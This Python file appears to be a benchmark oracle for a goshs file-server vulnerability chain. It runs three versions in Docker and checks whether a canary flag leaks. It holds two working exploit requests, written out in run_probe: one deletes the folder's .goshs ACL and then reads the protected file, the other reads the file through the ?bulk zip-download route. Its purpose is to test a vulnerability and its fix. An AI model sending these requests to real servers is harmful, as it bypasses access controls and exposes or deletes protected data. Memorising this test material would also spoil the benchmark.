#!/usr/bin/env python3
"""Flag differential oracle for goshs-cve-2026-54719.

Chain: CVE-2026-40189 (.goshs ACL bypass on state-changing routes, fixed 2.1.0)
     -> CVE-2026-54719 (?bulk zip-download ACL bypass, fixed 2.1.1).

V0 = goshs 2.0.9 (40189 vulnerable)
V1 = goshs 2.1.0 (40189 fixed; 54719 ?bulk vulnerable)  <- the target
V2 = goshs 2.1.1 (54719 fixed)

Canary /data/root/protected/canary.txt is gated by the per-folder .goshs ACL
(auth admin:admin). The seed deletes .goshs via ?delete then reads the canary;
the residual reads the canary through the ?bulk zip-download route.
"""
from __future__ import annotations

import argparse
import http.client
import io
import json
import os
import subprocess
import sys
import time
import urllib.request
import zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import FlagOracle, new_flag, validate_case_strict  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()

BASE = {"v0": 55130, "v1": 55131, "v2": 55132}


def _get(port, path):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}{path}", timeout=10) as r:
            return {"status": r.status, "body": r.read()}
    except Exception as e:
        return {"status": getattr(e, "code", None), "body": b""}


def _zip_text(blob: bytes) -> str:
    try:
        zf = zipfile.ZipFile(io.BytesIO(blob))
        return "\n".join(zf.read(n).decode("utf-8", "replace") for n in zf.namelist())
    except Exception:
        return blob.decode("utf-8", "replace")[:500]


def run_probe(candidate, *, version="v1"):
    port = BASE[version]
    kind = candidate.get("kind")
    if kind == "bulk":
        r = _get(port, "/?bulk&file=/protected/canary.txt")
        return {"status": r["status"], "body": _zip_text(r["body"])}
    # seed: delete ACL then read
    _get(port, "/protected/.goshs?delete")
    r = _get(port, "/protected/canary.txt")
    return {"status": r["status"], "body": r["body"].decode("utf-8", "replace")}


def original_poc(*, version="v1"):
    return run_probe({"kind": "delete_acl"}, version=version)


def bypass_poc(*, version="v1"):
    return run_probe({"kind": "bulk"}, version=version)


def mechanism_scope(candidate) -> bool:
    return candidate.get("kind") in ("delete_acl", "bulk")


def build_oracle() -> FlagOracle:
    o = FlagOracle(FLAG, run_probe, mechanism_scope)
    o.prime_seed(original_poc)
    return o


def gate() -> dict:
    return validate_case_strict(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
        bypass_on_v2=bypass_poc(version="v2"),
    )


def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False,
        env={**os.environ, **(env or {})},
    )


def _wait_ready(version: str, token: str, tries: int = 40) -> bool:
    port = BASE[version]
    for _ in range(tries):
        try:
            r = _get(port, "/")
            if r["status"] is not None:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def run_gate(profiles=("v0", "v1", "v2"), keep_up=False) -> dict:
    global FLAG
    FLAG = new_flag()
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "build", env=env)
    if r.returncode != 0:
        return {"error": "build failed", "stderr": r.stderr[-2000:]}
    r = _compose(*_profile_flags(profiles), "up", "-d", env=env)
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:]}
    for v in profiles:
        _wait_ready(v, FLAG)
    result = gate()
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", "--rmi", "all", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true")
    ap.add_argument("--run-gate", action="store_true")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
